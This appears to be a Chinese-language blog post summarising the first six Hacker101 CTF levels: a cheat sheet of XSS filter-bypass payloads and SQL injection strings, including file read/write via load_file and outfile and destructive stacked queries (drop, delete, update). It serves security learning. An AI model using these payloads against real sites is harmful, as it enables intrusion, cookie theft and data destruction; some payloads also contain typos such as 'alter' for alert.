---
title: "Hacker101 前6关总结"
date: 2019-10-20T16:39:55+08:00
showDate: true
draft: false
tags: ["security","hacker101", "ctf"]
categories: ["security"]
---


# hacker101前6关总结

## 常见web漏洞

### 常见xss（Cross Site Scripting）（为了防止和css混淆，被叫做xss）

#### 常用测试

* 1. 直接攻击

`<script>alter('xss')</script>`

`<script>prompt('xss')</script>`

* 2. 闭合input

`'><script>alter('xss')</script>`

#### 绕过双引号过滤

* 1. 用html编码

`<script>alert(&quot;XSS&quot;)</script>`

* 2. 用js的`fromCharCode`函数

`<script>alert(String.fromCharCode(88,83,83))</script>`

#### 绕过script过滤

* 1. 用事件处理

`<BODY onload="alert('XSS')">`
`<IMG SRC="" onerror="alert('XSS')">`

* 2. 用img标签

`<IMG SRC="javascript:alert('XSS');">`
`<IMG SRC=javascript:alert('XSS')>`
`<IMG SRC=JaVaScRiPt:alert('XSS')>`

* 3. 用空字符（只在 IE 6.0, IE 7.0 有效）

`<SCR%00IPT>alert("XSS")</SCRIPT>`

#### 双引号配对bug

`<IMG """><SCRIPT>alert('XSS')</SCRIPT>">`

由于标签不完整，导致被浏览器修正后变成

`<img><script>alert('xss')</script>"&gt;`

#### meta标签

`<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">`

`PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K`为`<script>alert(‘XSS’)</script>`的base64编码

#### 畸形a标签

`<a onmouseover="alert(document.cookie)">xxs link</a>`

被浏览器修正后变为

`<a onmouseover=alert(document.cookie)>xxs link</a>`

#### utf-7

`<script>alert("XSS")</script>`用utf-7编码后变为

`+ADw-script+AD4-alert(+ACI-XSS+ACI-)+ADw-/script+AD4-`

然后将加号替换成连接符

`%2BADw-script%2BAD4-alert%281%29%2BADw-/script%2BAD4-`

### sql注入

#### 简单测试

* 1. 字符串注入

    `' and 1=2`

* 2. 整型注入

    ` and 1=2`

#### 猜解数据库

`' LENGTH(DATABASE())=1`

这一步可以通过sqlmap自动化实现

#### union注入

` union select 1`

#### load_file、into outfile、into dumpfile

` union select load_file('path/to/file')`

` into outfile 'path/to/file'`

` into dumpfile 'path/to/file'`

outfile和dumpfile的区别在于outfile是导出多行数据，他会转义换行符，适合导出多行数据
dumpfile是导出一行，但会保持源数据格式

这三个功能会被mysql`secure_file_priv`参数限制,具体如下

* 其中当参数 secure_file_priv 为空时，对导入导出无限制
* 当值为一个指定的目录时，只能向指定的目录导入导出
* 当值被设置为NULL时，禁止导入导出功能

默认情况下的值为`/var/lib/mysql-files`

#### 堆叠注入（stacked injection）

`;drop table xxx;`

`;delete from table xxx;commit;`

`;update xxx set sss='';commit;`

这个需要看具体环境支不支持执行多条语句，经过测试python2的mysqldb中的`cur.execute()`存在堆叠注入。但是python3中的pymysql并不会。

    












